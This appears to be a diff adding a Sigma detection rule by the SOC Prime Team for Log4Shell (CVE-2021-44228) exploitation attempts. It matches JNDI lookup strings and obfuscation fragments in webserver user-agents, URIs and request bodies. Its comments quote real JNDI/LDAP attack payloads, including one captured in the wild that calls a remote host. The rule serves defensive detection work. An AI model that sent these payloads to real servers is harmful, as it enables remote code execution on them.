@@ -1,0 +1,98 @@
+title: Log4jTEST
+status: stable
+description: Detects
+author: SOC Prime Team
+tags:
+    - attack.initial_access
+    - attack.t1190
+references:
+    - https://www.randori.com/blog/cve-2021-44228/
+    - https://blog.cloudflare.com/cve-2021-44228-log4j-rce-0-day-mitigation/
+    - https://www-cnblogs-com.translate.goog/yyhuni/p/15088134.html?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en-US
+    - https://gist.github.com/Neo23x0/e4c8b03ff8cdf1fa63b7d15db6e3860b
+    - https://www.lunasec.io/docs/blog/log4j-zero-day/
+    - https://www.reddit.com/r/programming/comments/rcxehp/rce_0day_exploit_found_in_log4j_a_popular_java/
+    - https://github.com/YfryTchsGD/Log4jAttackSurface
+    - https://gist.github.com/byt3bl33d3r/46661bc206d323e6770907d259e009b6
+    - https://github.com/tangxiaofeng7/apache-log4j-poc
+    - https://github.com/apache/logging-log4j2/pull/608
+    - https://www.tenable.com/blog/cve-2021-44228-proof-of-concept-for-critical-apache-log4j-remote-code-execution-vulnerability
+    - https://www.crowdstrike.com/blog/log4j2-vulnerability-analysis-and-mitigation-recommendations/
+    - https://blog.qualys.com/vulnerabilities-threat-research/2021/12/10/apache-log4j2-zero-day-exploited-in-the-wild-log4shell
+    - https://unit42.paloaltonetworks.com/apache-log4j-vulnerability-cve-2021-44228/
+    - https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/
+    - https://blog.cloudflare.com/actual-cve-2021-44228-payloads-captured-in-the-wild/
+logsource:
+  category: webserver
+detection:
+  selection_base_ua:
+    c-useragent|contains:
+      - 'jndi' #real attack example: ${jndi:ldap://45.XXX.205.XXX:12344/Basic/Command/Base64/XXX==}
+  selection_vars_ua:
+    c-useragent|contains:
+      - 'ldap'
+      - 'rmi'
+      - 'ldaps'
+      - 'dns'
+      - 'lower' # ${jndi:${lower:l}${lower:d}a${lower:p}://loc${upper:a}lhost:1389/rce}
+      - 'upper'
+  selection_ua_generic:
+    c-useragent|contains:
+      - ':-j}'
+      - '${::'
+      - ':-nD}'
+      - ':-Dn}'
+      - 'ENV_NAME'
+      - ':-DN}'
+      - 'base64'
+      - '}ndi'
+      - 'j${'
+  selection_base_url: #https://blog.cloudflare.com/cve-2021-44228-log4j-rce-0-day-mitigation/
+    c-uri|contains:
+      - 'jndi' 
+  selection_vars_url:
+    c-uri|contains:
+      - 'ldap'
+      - 'rmi'
+      - 'ldaps'
+      - 'dns'
+      - 'lower' # ${jndi:${lower:l}${lower:d}a${lower:p}://loc${upper:a}lhost:1389/rce}
+      - 'upper'
+  selection_url_generic:
+    c-uri|contains:
+      - ':-j}'
+      - '${::'
+      - ':-nD}'
+      - ':-Dn}'
+      - 'ENV_NAME'
+      - ':-DN}'
+      - 'base64'
+      - '}ndi'
+      - 'j${'
+  selection_base_body: #https://blog.cloudflare.com/cve-2021-44228-log4j-rce-0-day-mitigation/
+    post-body|contains:
+      - 'jndi' 
+  selection_vars_body:
+    post-body|contains:
+      - 'ldap'
+      - 'rmi'
+      - 'ldaps'
+      - 'dns'
+      - 'lower' # ${jndi:${lower:l}${lower:d}a${lower:p}://loc${upper:a}lhost:1389/rce}
+      - 'upper'
+  selection_body_generic:
+    post-body|contains:
+      - ':-j}'
+      - '${::'
+      - ':-nD}'
+      - ':-Dn}'
+      - 'ENV_NAME'
+      - ':-DN}'
+      - 'base64'
+      - '}ndi'
+      - 'j${'
+  condition: (selection_base_ua and selection_vars_ua) or (selection_base_url and selection_vars_url) or (selection_base_body and selection_vars_body) or selection_body_generic or selection_url_generic or selection_ua_generic
+falsepositives:
+  - Unknown
+level: high
+id: 223de4e9-1857-499c-bffc-bf50d664e6cd
